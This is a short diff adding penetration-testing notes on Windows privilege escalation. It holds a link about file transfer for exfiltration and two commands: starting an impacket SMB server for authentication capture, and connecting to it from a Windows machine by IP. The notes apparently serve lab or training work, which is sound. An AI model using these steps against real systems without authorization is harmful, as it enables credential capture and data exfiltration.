@@ -1,0 +1,17 @@
+[-]======================================[-]
+    windows privilege escalation
+[-]======================================[-]
+
+- ---] References
+=====================
+# Sharing files (Exfil)
+https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65
+
+- ---] impacket-smbserver (auth capture)
+
+# Configure SMB server
+impacket-smbserver <sharename> <path to share>
+
+# Connect from Windows machine
+net view \\192.168.119.131
+
